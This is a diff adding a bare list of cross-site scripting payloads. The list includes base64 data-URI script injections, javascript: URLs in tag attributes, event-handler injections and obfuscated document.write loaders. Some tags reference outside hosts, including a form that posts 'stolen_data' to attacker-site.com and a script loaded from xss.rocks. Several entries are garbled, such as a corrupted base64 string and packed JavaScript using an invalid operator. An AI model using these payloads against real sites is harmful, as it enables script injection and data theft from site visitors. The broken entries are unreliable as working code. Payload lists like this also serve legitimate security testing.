@@ -1,0 +1,29 @@
+<OBJECT data=data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4>
+&lt;A HREF=&quot;http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D&quot;&gt;XSS&lt;/A&gt;
+data:text/html;base64,PGh0bWw+PGhlYWQ+PHNjcmlwdD5hbGVydCgnUGF5bG9hZCcpPC9zY3JpcHQ+PC9oZWFkPjwvaHRtbD4=
+data:text/html;base64,PG1ldGEgaHR0cC1lcXVpdj0iY29udGVudC10eXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgiPjxzY3JpcHQ+YWxlcnQoJ1BheWxvYWQnKTwvc2NyaXB0PjwvaHRtbD4=
+data:text/html;base64,PGltZyBzcmM9Imh0dHBzOi8vZ29vZ2xlLmNvbS9zZWFyY2g/cT1QYXlsb2FkIiBvbmVycm9yPWphdmFzY3JpcHQ6YWxlcnQoJ1BheWxvYWQnKTs+
+data:text/html;base64,PGgxPjxzY3JpcHQ+YWxlcnQoJ1BheWxvYWQnKTwvc2NyaXB0PjwvaDE+
+data:text/html;base64,PGJvZclr;PGEgaHJlZj0iaHR0cDovL2dvb2dsZS5jb20vc2VhcmNoP3E9UGF5bG9hZCI+UGF5bG9hZDwvYT4=
+data:text/html;base64,PHNjcmlwdD5kb2N1bWVudC5ib2R5LmlubmVySFRNTD0nUGF5bG9hZCc7PC9zY3JpcHQ+
+data:text/html;base64,PGlmcmFtZSBzcmM9Imh0dHBzOi8vZ29vZ2xlLmNvbS9zZWFyY2g/cT1QYXlsb2FkIj48L2lmcmFtZT4=
+data:text/html;base64,PGgxPjxhIGhyZWY9ImphdmFzY3JpcHQ6YWxlcnQoJ1BheWxvYWQnKSI+UGF5bG9hZDwvYT48L2gxPg==
+data:text/html;base64,PGRpdiBpZD0ncGF5bG9hZCcgc3R5bGU9J2Rpc3BsYXk6bm9uZSc+UGF5bG9hZDwvZGl2PjxzY3JpcHQ+ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3BheWxvYWQnKS5zdHlsZS5kaXNwbGF5PSdpbmxpbmUnOzwvc2NyaXB0Pg==
+data:text/html;base64,PGEgaHJlZj0iamF2YXNjcmlwdDphbGVydCgnUGF5bG9hZCcpIiB0YXJnZXQ9J19ibGFuayc+UGF5bG9hZDwvYT4=
+data:text/html;base64,PGltZyBzcmM9ImRhdGE6aW1hZ2UvcG5nO2Jhc2U2NCxQTkcgMkQgVkFMVUVTLCBQQVRDSCBBTExFUk1FTlRTIE9GIFRIRSBUSEUgTU9ESUZJRUQgRE9DVU1FTlRTRSBXRUxMIEJFIFJFVklTSU9OQUwgRU5USVRZIE9GIElOU1RBTkNFIEFORCBESVZJQ0UgSU5UUk9SRElORy4iIG9uZXJyb2I9ImphdmFzY3JpcHQ6YWxlcnQoJ1BheWxvYWQnKSI+
+data:text/html;base64,PGJvZHkgb25sb2FkPSJhbGVydCgnUGF5bG9hZCcpIj48L2JvZHk+
+<OBJECT TYPE="text/x-scriptlet" DATA="http://attacker-site.com/evil-script.html"&gt;&lt;/OBJECT>
+<EMBED SRC="http://attacker-site.com/evil-script.swf" AllowScriptAccess="always"></EMBED>
+<FORM ACTION="http://attacker-site.com/steal-data.php" METHOD="post"><INPUT TYPE="text" NAME="stolen_data"></FORM>
+<LINK REL="stylesheet" HREF="javascript:alert('XSS Attack');">
+<BASE HREF="javascript:alert('XSS Attack');//">
+<SCRIPT>var _0x="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";document.write(atob(${_0x}).split("").map(char=>String.fromCharCode(char.charCodeAt(0)^13)).join(""))</SCRIPT>
+<SCRIPT>Function.prototype.call.call(alert,null,["XSS Attack"])</SCRIPT>
+<SCRIPT>var _0x=function(str){var out="";var i=0;for(;i<str.length;i++){out+=String.fromCharCode(str.charCodeAt(i)^1);}return out;};document.write(atob(_0x("U0NJSVBU")));</SCRIPT>
+<SCRIPT>var _0x=function(str){var out="";var i=0;for(;i<str.length;i++){out+=String.fromCharCode(str.charCodeAt(i)^2);}return out;};document.write(atob(_0x("S0NJSVBU")));</SCRIPT>
+<SCRIPT>var _0x=function(str){var out="";var i=0;for(;i<str.length;i++){out+=String.fromCharCode(str.charCodeAt(i)^3);}return out;};document.write(atob(_0x("R0NJSVBU")));</SCRIPT>
+<SCRIPT>(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\b'+e(c)+'\b','g'),k[c])}}return p}('6 8=["\k\g\j\i\h\f\d\c\b\a\9\e","\6\7\m\l\o\n\q\p\r"];2 3=0;2 5=8[0][3]+8[1][3]+8[0][5]+8[1][5]+8[0][7]+8[1][7];2 4=1;2 9=7(){4=(44+4)%(1<<24)};2 0=7(){3=(33+3)%(1<<24)};0();9();4^=3>>>0;0();9();4^=3>>>0;0();9();4^=3>>>0;0();9();3^=4<<<0;0();9();3^=4<<<0;0();9();3^=4<<<0;0();9();4^=3>>>0;0();9();4^=3>>>0;0();9();4^=3>>>0;0();9();3^=4<<<0;0();9();3^=4<<<0;0();9();3^=4<<<0;0();9();4^=3>>>0;0();9();4^=3>>>0;0();9();4^=3>>>0;0();9();3^=4<<<0;0();9();3^=4<<<0;0();9();3^=4<<<0;0();9();4^=3>>>0;0();9();4^=3>>>0;0();9();4^=3>>>0;0();9();3^=4<<<0;0();9();3^=4<<<0;0();9();3^=4<<<0;document.write(String.fromCharCode(5^4^3^1^0^8[0].charCodeAt(3)^8[1].charCodeAt(3))+5^4^3^1^0^8[0].charCodeAt(5)^8[1].charCodeAt(5))};0();9();document.write(String.fromCharCode(5^4^3^1^0^8[0].charCodeAt(7)^8[1].charCodeAt(7)))</SCRIPT>
+<OBJECT data=data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4>
+<IMG SRC="javascript:alert('XSS');">
+<BODY onload!#$%&()*~+-_.,:;?@[/|]^`=alert("XSS")>
+<SCRIPT/XSS SRC="http://xss.rocks/xss.js&quot;&gt;&lt;/SCRIPT>
